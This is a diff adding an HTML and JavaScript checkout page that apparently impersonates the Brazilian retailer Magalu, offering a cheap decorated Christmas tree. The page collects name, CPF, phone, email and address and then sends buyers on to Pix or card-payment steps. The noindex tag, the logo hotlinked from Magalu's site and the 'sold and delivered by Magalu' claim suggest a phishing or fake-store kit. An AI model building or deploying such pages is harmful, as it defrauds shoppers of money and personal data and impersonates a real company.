@@ -1,0 +1,616 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalizar compra - Árvore de Natal 2,10m AQUATTRO | Magalu</title>
+    <meta name="description" content="Finalize sua compra com segurança. Pague no Pix ou no Cartão de crédito em até 10x sem juros.">
+    <meta name="robots" content="noindex">
+    <link rel="icon" type="image/jpeg" href="images/623609fda92453760ebe2b5b71acc97a-1.jpg">
+    <link rel="stylesheet" href="css/all.min-1.css">
+    <link rel="stylesheet" href="css/style-1.css">
+    <!-- Meta Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1669086081242260');
+      fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none" src="tr-2?id=1669086081242260&ev=PageView&noscript=1"></noscript>
+    <!-- End Meta Pixel Code -->
+</head>
+<body class="ck-body">
+
+    <header class="ck-header">
+        <div class="ck-header-top">
+            <a href="/" class="ck-brand">
+                <img src="https://m.magazineluiza.com.br/mixer-web/static/shared/logo/lu-logo-avatar.png" alt="Lu do Magalu">
+                <span>magalu</span>
+            </a>
+            <div class="ck-secure">
+                <i class="fa-solid fa-lock"></i><span>Ambiente 100% seguro</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="ck-container">
+        <h1 class="ck-title">Finalizar compra</h1>
+        <p class="ck-subtitle">Preencha seus dados abaixo para receber o pedido no endereço informado.</p>
+
+        <div class="ck-grid" id="ck-grid">
+
+            <!-- COLUNA DE DADOS -->
+            <div class="ck-col">
+                <form id="ck-form" novalidate="">
+
+                    <!-- Seus dados -->
+                    <section class="ck-card">
+                        <h2 class="ck-section-title"><i class="fa-solid fa-user"></i> Seus dados</h2>
+
+                        <div class="ck-row" style="grid-template-columns: 1fr;">
+                            <div class="ck-field">
+                                <label for="ck-nome">Nome completo *</label>
+                                <input type="text" id="ck-nome" placeholder="Ex: Maria da Silva" autocomplete="name">
+                                <span class="ck-error" id="err-nome"></span>
+                            </div>
+                        </div>
+
+                        <div class="ck-row">
+                            <div class="ck-field">
+                                <label for="ck-cpf">CPF *</label>
+                                <input type="text" id="ck-cpf" inputmode="numeric" placeholder="000.000.000-00">
+                                <span class="ck-error" id="err-cpf"></span>
+                            </div>
+                            <div class="ck-field">
+                                <label for="ck-telefone">Telefone / WhatsApp *</label>
+                                <input type="tel" id="ck-telefone" inputmode="numeric" placeholder="(11) 99999-9999">
+                                <span class="ck-error" id="err-telefone"></span>
+                            </div>
+                        </div>
+
+                        <div class="ck-row" style="grid-template-columns: 1fr;">
+                            <div class="ck-field">
+                                <label for="ck-email">E-mail *</label>
+                                <input type="email" id="ck-email" placeholder="voce@email.com" autocomplete="email">
+                                <span class="ck-error" id="err-email"></span>
+                            </div>
+                        </div>
+                    </section>
+
+                    <!-- Endereço -->
+                    <section class="ck-card">
+                        <h2 class="ck-section-title"><i class="fa-solid fa-location-dot"></i> Endereço de entrega</h2>
+
+                        <div class="ck-row" style="grid-template-columns: 1fr; margin-bottom: 6px;">
+                            <div class="ck-field">
+                                <label for="ck-cep">CEP *</label>
+                                <div class="ck-inline">
+                                    <input type="text" id="ck-cep" inputmode="numeric" placeholder="00000-000" maxlength="9" autocomplete="postal-code">
+                                    <button type="button" class="ck-btn-cep" id="ck-buscar-cep">Buscar</button>
+                                </div>
+                                <span class="ck-error" id="err-cep"></span>
+                                <span class="ck-hint" id="ck-cep-hint">Digite o CEP para preencher o endereço automaticamente.</span>
+                                <div id="ck-delivery-estimate" style="display: none; margin-top: 10px; padding: 10px; background-color: #e5f7ed; border-radius: 4px; border: 1px solid #c3e6cb; color: #155724; font-size: 13px;">
+                                    <i class="fa-solid fa-truck"></i> Entrega prevista para: <strong id="ck-delivery-date"></strong>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="ck-row" style="grid-template-columns: 1fr;">
+                            <div class="ck-field">
+                                <label for="ck-logradouro">Rua / Logradouro *</label>
+                                <input type="text" id="ck-logradouro" placeholder="Ex: Avenida Paulista">
+                                <span class="ck-error" id="err-logradouro"></span>
+                            </div>
+                        </div>
+
+                        <div class="ck-row">
+                            <div class="ck-field">
+                                <label for="ck-numero">Número *</label>
+                                <input type="text" id="ck-numero" placeholder="Ex: 1000">
+                                <span class="ck-error" id="err-numero"></span>
+                            </div>
+                            <div class="ck-field">
+                                <label for="ck-complemento">Complemento</label>
+                                <input type="text" id="ck-complemento" placeholder="Apto, bloco, casa (opcional)">
+                            </div>
+                        </div>
+
+                        <div class="ck-row three">
+                            <div class="ck-field">
+                                <label for="ck-bairro">Bairro *</label>
+                                <input type="text" id="ck-bairro">
+                                <span class="ck-error" id="err-bairro"></span>
+                            </div>
+                            <div class="ck-field">
+                                <label for="ck-cidade">Cidade *</label>
+                                <input type="text" id="ck-cidade">
+                                <span class="ck-error" id="err-cidade"></span>
+                            </div>
+                            <div class="ck-field">
+                                <label for="ck-uf">UF *</label>
+                                <input type="text" id="ck-uf" maxlength="2" placeholder="SP" style="text-transform: uppercase;">
+                                <span class="ck-error" id="err-uf"></span>
+                            </div>
+                        </div>
+                    </section>
+
+                    <!-- Pagamento -->
+                    <section class="ck-card">
+                        <h2 class="ck-section-title"><i class="fa-solid fa-wallet"></i> Forma de pagamento</h2>
+
+                        <div class="ck-pay-options">
+                            <label class="ck-pay-option active" for="pay-pix">
+                                <input type="radio" name="pagamento" id="pay-pix" value="pix" checked="">
+                                <i class="fa-solid fa-qrcode"></i>
+                                <span>
+                                    <strong>Pix</strong>
+                                    <small>R$ 177,87 à vista · aprovação imediata</small>
+                                </span>
+                            </label>
+                            <label class="ck-pay-option" for="pay-cartao">
+                                <input type="radio" name="pagamento" id="pay-cartao" value="cartao">
+                                <i class="fa-solid fa-credit-card"></i>
+                                <span>
+                                    <strong>Cartão de crédito</strong>
+                                    <small>R$ 207,87 em até 10x sem juros</small>
+                                </span>
+                            </label>
+                        </div>
+                    </section>
+
+                </form>
+            </div>
+
+            <!-- COLUNA DO RESUMO -->
+            <aside class="ck-col ck-summary">
+                <div class="ck-card">
+                    <h2 class="ck-section-title"><i class="fa-solid fa-bag-shopping"></i> Resumo do pedido</h2>
+
+                    <div class="ck-product">
+                        <img src="images/p1-1.webp" alt="Árvore de Natal 2,10m Decorada Vermelha Luxo Pinheiro Canadense Verde Cheia 1200 Galhos Aquattro" id="ck-product-img">
+                        <div>
+                            <p class="ck-product-title">Árvore de Natal 2,10m Decorada Vermelha Luxo Pinheiro Canadense Verde Cheia 1200 Galhos Imperial +122 Itens AQUATTRO</p>
+                            <p class="ck-product-seller">Cor: <strong id="ck-selected-color-display">Verde</strong></p>
+                            <p class="ck-product-seller">Vendido e entregue por Magalu</p>
+                        </div>
+                    </div>
+
+                    <div class="ck-line"><span>Subtotal</span><span id="summary-subtotal">R$ 177,87</span></div>
+                    <div class="ck-line"><span>Frete</span><span class="ck-free">Grátis</span></div>
+                    <div class="ck-line total"><span>Total</span><span class="ck-total-value" id="summary-total">R$ 177,87</span></div>
+
+                    <p class="ck-hint" id="ck-payment-note" style="margin-top: 6px;">Pagamento à vista no Pix com aprovação imediata.</p>
+
+                    <div class="ck-alert" id="ck-erro-geral" style="display: none;"></div>
+
+                    <button type="button" class="ck-btn-finish" id="ck-finish">
+                        <i class="fa-solid fa-lock"></i> Finalizar compra
+                    </button>
+
+                    <div class="ck-secure-note">
+                        <i class="fa-solid fa-shield-halved"></i> Seus dados são criptografados e usados apenas para processar o pedido.
+                    </div>
+                </div>
+            </aside>
+        </div>
+    </main>
+
+    <script>
+    (function () {
+        'use strict';
+
+        var CHAVE_PIX_PAYLOAD = 'ck_pix_payload';
+        var CHAVE_CARTAO_PAYLOAD = 'ck_cartao_payload';
+        var CHAVE_PIX_ERRO = 'ck_pix_erro';
+        var CHAVES_UTM = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'];
+
+        /* Campo devolvido pelo back -> input correspondente nesta tela. */
+        var CAMPO_PARA_INPUT = {
+            name: 'ck-nome',
+            email: 'ck-email',
+            phone: 'ck-telefone',
+            document: 'ck-cpf',
+            'shipping.street': 'ck-logradouro',
+            'shipping.number': 'ck-numero',
+            'shipping.complement': 'ck-complemento',
+            'shipping.neighborhood': 'ck-bairro',
+            'shipping.city': 'ck-cidade',
+            'shipping.state': 'ck-uf',
+            'shipping.zipCode': 'ck-cep'
+        };
+
+        var $ = function (id) { return document.getElementById(id); };
+        var soDigitos = function (v) { return (v || '').replace(/\D/g, ''); };
+
+        var elNome = $('ck-nome');
+        var elCpf = $('ck-cpf');
+        var elEmail = $('ck-email');
+        var elTelefone = $('ck-telefone');
+        var elCep = $('ck-cep');
+        var elLogradouro = $('ck-logradouro');
+        var elNumero = $('ck-numero');
+        var elComplemento = $('ck-complemento');
+        var elBairro = $('ck-bairro');
+        var elCidade = $('ck-cidade');
+        var elUf = $('ck-uf');
+        var elCepHint = $('ck-cep-hint');
+        var elBtnCep = $('ck-buscar-cep');
+        var elFinish = $('ck-finish');
+
+        /* ---------- DATA DE ENTREGA (+7 DIAS) ---------- */
+        function formatarDataEntrega(diasPrazo = 7) {
+            const dataEntrega = new Date();
+            dataEntrega.setDate(dataEntrega.getDate() + diasPrazo);
+
+            const diasSemana = [
+                'domingo', 'segunda-feira', 'terça-feira', 'quarta-feira',
+                'quinta-feira', 'sexta-feira', 'sábado'
+            ];
+            const meses = [
+                'janeiro', 'fevereiro', 'março', 'abril', 'maio', 'junho',
+                'julho', 'agosto', 'setembro', 'outubro', 'novembro', 'dezembro'
+            ];
+
+            const diaSemana = diasSemana[dataEntrega.getDay()];
+            const dia = String(dataEntrega.getDate()).padStart(2, '0');
+            const mes = meses[dataEntrega.getMonth()];
+
+            return `${diaSemana}, ${dia} de ${mes}`;
+        }
+
+        function exibirPrazoEntrega() {
+            var elEstimate = $('ck-delivery-estimate');
+            var elDate = $('ck-delivery-date');
+            if (elEstimate && elDate) {
+                elDate.textContent = formatarDataEntrega(7);
+                elEstimate.style.display = 'block';
+            }
+        }
+
+        /* ---------- MÁSCARAS ---------- */
+        function maskCpf(v) {
+            v = soDigitos(v).slice(0, 11);
+            return v
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        }
+
+        function maskTelefone(v) {
+            v = soDigitos(v).slice(0, 11);
+            if (v.length <= 10) {
+                return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{4})(\d{1,4})$/, '$1-$2');
+            }
+            return v.replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d{1,4})$/, '$1-$2');
+        }
+
+        function maskCep(v) {
+            v = soDigitos(v).slice(0, 8);
+            return v.replace(/(\d{5})(\d{1,3})/, '$1-$2');
+        }
+
+        /* ---------- ERROS ---------- */
+        function setErro(input, errId, msg) {
+            var errEl = $(errId);
+            if (msg) {
+                input.classList.add('invalid');
+                errEl.textContent = msg;
+                errEl.classList.add('show');
+            } else {
+                input.classList.remove('invalid');
+                errEl.textContent = '';
+                errEl.classList.remove('show');
+            }
+        }
+
+        function limparErros() {
+            document.querySelectorAll('.ck-field input, .ck-field select').forEach(function (el) {
+                el.classList.remove('invalid');
+            });
+            document.querySelectorAll('.ck-error').forEach(function (el) {
+                el.textContent = '';
+                el.classList.remove('show');
+            });
+            var alerta = $('ck-erro-geral');
+            if (alerta) {
+                alerta.textContent = '';
+                alerta.style.display = 'none';
+            }
+        }
+
+        /* Mostra o motivo vindo do back e destaca o campo com problema. */
+        function aplicarErroApi() {
+            var bruto;
+            try {
+                bruto = sessionStorage.getItem(CHAVE_PIX_ERRO);
+                sessionStorage.removeItem(CHAVE_PIX_ERRO);
+            } catch (e) {
+                return;
+            }
+            if (!bruto) return;
+
+            var info;
+            try {
+                info = JSON.parse(bruto);
+            } catch (e) {
+                return;
+            }
+            if (!info || !info.mensagem) return;
+
+            var alerta = $('ck-erro-geral');
+            alerta.textContent = info.mensagem;
+            alerta.style.display = 'block';
+
+            var inputId = CAMPO_PARA_INPUT[info.campo];
+            var input = inputId ? $(inputId) : null;
+
+            if (input) {
+                input.classList.add('invalid');
+                var errEl = $('err-' + inputId.slice(3));
+                if (errEl) {
+                    errEl.textContent = info.mensagem;
+                    errEl.classList.add('show');
+                }
+                input.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                input.focus();
+            } else {
+                alerta.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }
+        }
+
+        /* ---------- VALIDAÇÕES ---------- */
+        function cpfValido(cpf) {
+            cpf = soDigitos(cpf);
+            if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+            var soma = 0, i, resto;
+            for (i = 0; i < 9; i++) soma += parseInt(cpf[i], 10) * (10 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10) resto = 0;
+            if (resto !== parseInt(cpf[9], 10)) return false;
+            soma = 0;
+            for (i = 0; i < 10; i++) soma += parseInt(cpf[i], 10) * (11 - i);
+            resto = (soma * 10) % 11;
+            if (resto === 10) resto = 0;
+            return resto === parseInt(cpf[10], 10);
+        }
+
+        function emailValido(v) {
+            return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(v);
+        }
+
+        /* ---------- CEP (ViaCEP) ---------- */
+        var ultimoCepConsultado = '';
+
+        async function buscarCep() {
+            var cep = soDigitos(elCep.value);
+            if (cep.length !== 8) {
+                setErro(elCep, 'err-cep', 'Digite um CEP com 8 dígitos.');
+                return;
+            }
+            if (cep === ultimoCepConsultado) return;
+
+            elBtnCep.disabled = true;
+            elBtnCep.textContent = '...';
+
+            try {
+                var resp = await fetch('https://viacep.com.br/ws/' + cep + '/json/');
+                var data = await resp.json();
+
+                if (data.erro) {
+                    setErro(elCep, 'err-cep', 'CEP não encontrado. Confira o número digitado.');
+                    elCepHint.textContent = 'Digite o CEP para preencher o endereço automaticamente.';
+                    return;
+                }
+
+                elLogradouro.value = data.logradouro || '';
+                elBairro.value = data.bairro || '';
+                elCidade.value = data.localidade || '';
+                elUf.value = (data.uf || '').toUpperCase();
+                ultimoCepConsultado = cep;
+
+                setErro(elCep, 'err-cep', '');
+                setErro(elLogradouro, 'err-logradouro', '');
+                setErro(elBairro, 'err-bairro', '');
+                setErro(elCidade, 'err-cidade', '');
+                setErro(elUf, 'err-uf', '');
+
+                elCepHint.textContent = 'Endereço encontrado. Confira e edite se precisar.';
+                exibirPrazoEntrega();
+                elNumero.focus();
+            } catch (e) {
+                setErro(elCep, 'err-cep', 'Não foi possível consultar o CEP. Tente novamente.');
+            } finally {
+                elBtnCep.disabled = false;
+                elBtnCep.textContent = 'Buscar';
+            }
+        }
+
+        elCep.addEventListener('input', function (e) {
+            var digitos = soDigitos(e.target.value);
+            e.target.value = maskCep(digitos);
+            elCepHint.textContent = 'Digite o CEP para preencher o endereço automaticamente.';
+            if (digitos.length === 8) buscarCep();
+        });
+
+        elCep.addEventListener('blur', function () {
+            if (soDigitos(elCep.value).length === 8) buscarCep();
+        });
+
+        elBtnCep.addEventListener('click', buscarCep);
+
+        /* ---------- PAGAMENTO ---------- */
+        function atualizarPagamento() {
+            var selecionado = document.querySelector('input[name="pagamento"]:checked').value;
+
+            document.querySelectorAll('.ck-pay-option').forEach(function (opt) {
+                opt.classList.toggle('active', opt.querySelector('input').checked);
+            });
+
+            var preco = selecionado === 'cartao' ? 207.87 : 177.87;
+            var precoFormatado = 'R$ ' + preco.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            
+            $('summary-subtotal').textContent = precoFormatado;
+            $('summary-total').textContent = precoFormatado;
+
+            $('ck-payment-note').textContent = selecionado === 'cartao'
+                ? 'No próximo passo você informa os dados do cartão. Total de ' + precoFormatado + ' em até 10x sem juros.'
+                : 'Pagamento à vista no Pix com aprovação imediata.';
+        }
+
+        document.querySelectorAll('input[name="pagamento"]').forEach(function (radio) {
+            radio.addEventListener('change', atualizarPagamento);
+        });
+
+        /* ---------- COLETA E VALIDAÇÃO ---------- */
+        function coletarDados() {
+            var pagamento = document.querySelector('input[name="pagamento"]:checked').value;
+            return {
+                nome: elNome.value.trim(),
+                cpf: elCpf.value.trim(),
+                email: elEmail.value.trim(),
+                telefone: elTelefone.value.trim(),
+                cep: elCep.value.trim(),
+                logradouro: elLogradouro.value.trim(),
+                numero: elNumero.value.trim(),
+                complemento: elComplemento.value.trim(),
+                bairro: elBairro.value.trim(),
+                cidade: elCidade.value.trim(),
+                uf: elUf.value.trim().toUpperCase(),
+                pagamento: pagamento
+            };
+        }
+
+        function validar(d) {
+            var ok = true;
+
+            if (d.nome.length < 3) { setErro(elNome, 'err-nome', 'Informe seu nome completo.'); ok = false; }
+            else setErro(elNome, 'err-nome', '');
+
+            if (!cpfValido(d.cpf)) { setErro(elCpf, 'err-cpf', 'Informe um CPF válido.'); ok = false; }
+            else setErro(elCpf, 'err-cpf', '');
+
+            if (!emailValido(d.email)) { setErro(elEmail, 'err-email', 'Informe um e-mail válido.'); ok = false; }
+            else setErro(elEmail, 'err-email', '');
+
+            if (soDigitos(d.telefone).length < 10) { setErro(elTelefone, 'err-telefone', 'Informe DDD + telefone.'); ok = false; }
+            else setErro(elTelefone, 'err-telefone', '');
+
+            if (soDigitos(d.cep).length !== 8) { setErro(elCep, 'err-cep', 'Informe um CEP válido.'); ok = false; }
+            else setErro(elCep, 'err-cep', '');
+
+            if (d.logradouro.length < 3) { setErro(elLogradouro, 'err-logradouro', 'Informe a rua / logradouro.'); ok = false; }
+            else setErro(elLogradouro, 'err-logradouro', '');
+
+            if (!d.numero) { setErro(elNumero, 'err-numero', 'Informe o número.'); ok = false; }
+            else setErro(elNumero, 'err-numero', '');
+
+            if (!d.bairro) { setErro(elBairro, 'err-bairro', 'Informe o bairro.'); ok = false; }
+            else setErro(elBairro, 'err-bairro', '');
+
+            if (!d.cidade) { setErro(elCidade, 'err-cidade', 'Informe a cidade.'); ok = false; }
+            else setErro(elCidade, 'err-cidade', '');
+
+            if (d.uf.length !== 2) { setErro(elUf, 'err-uf', 'Informe a UF.'); ok = false; }
+            else setErro(elUf, 'err-uf', '');
+
+            return ok;
+        }
+
+        /* ---------- FINALIZAR ---------- */
+        function capturarUtms() {
+            var params = new URLSearchParams(window.location.search);
+            var utms = {};
+            CHAVES_UTM.forEach(function (chave) {
+                var valor = params.get(chave);
+                if (valor) utms[chave] = valor;
+            });
+            return utms;
+        }
+
+        function montarPayload(d) {
+            var documento = soDigitos(d.cpf);
+            var productId = d.pagamento === 'cartao' ? 'arvore-natal-2-10m-aquattro-cartao' : 'arvore-natal-2-10m-aquattro';
+            return {
+                items: [{ id: productId, quantity: 1 }],
+                customer: {
+                    name: d.nome,
+                    email: d.email,
+                    phone: soDigitos(d.telefone),
+                    document: {
+                        number: documento,
+                        type: documento.length === 14 ? 'cnpj' : 'cpf'
+                    }
+                },
+                shipping: {
+                    street: d.logradouro,
+                    number: d.numero,
+                    complement: d.complemento,
+                    neighborhood: d.bairro,
+                    city: d.cidade,
+                    state: d.uf,
+                    zipCode: soDigitos(d.cep)
+                },
+                utm: capturarUtms()
+            };
+        }
+
+        /* Guarda os dados e encaminha para a tela de pagamento escolhida. */
+        function enviarPedido(dados) {
+            var chave = dados.pagamento === 'cartao' ? CHAVE_CARTAO_PAYLOAD : CHAVE_PIX_PAYLOAD;
+            try {
+                sessionStorage.setItem(chave, JSON.stringify(montarPayload(dados)));
+            } catch (e) {}
+            window.location.href = dados.pagamento === 'cartao' ? '/checkout/cartao' : '/checkout/pix';
+        }
+
+        function finalizar() {
+            limparErros();
+            var dados = coletarDados();
+
+            if (!validar(dados)) {
+                var primeiro = document.querySelector('.ck-field input.invalid, .ck-field select.invalid');
+                if (primeiro) primeiro.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                return;
+            }
+
+            elFinish.disabled = true;
+            elFinish.innerHTML = 'Processando...';
+            setTimeout(function () { enviarPedido(dados); }, 400);
+        }
+
+        elFinish.addEventListener('click', finalizar);
+        $('ck-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+            finalizar();
+        });
+
+        /* ---------- INICIALIZAÇÃO ---------- */
+        function carregarCorSelecionada() {
+            var cor = sessionStorage.getItem('ck_selected_color');
+            if (cor) {
+                var elCor = $('ck-selected-color-display');
+                if (elCor) elCor.textContent = cor;
+            }
+        }
+
+        elCpf.addEventListener('input', function (e) { e.target.value = maskCpf(e.target.value); });
+        elTelefone.addEventListener('input', function (e) { e.target.value = maskTelefone(e.target.value); });
+        elUf.addEventListener('input', function (e) {
+            e.target.value = e.target.value.toUpperCase().replace(/[^A-Za-z]/g, '').slice(0, 2);
+        });
+
+        atualizarPagamento();
+        aplicarErroApi();
+        carregarCorSelecionada();
+    })();
+    </script>
+
+</body>
+</html>
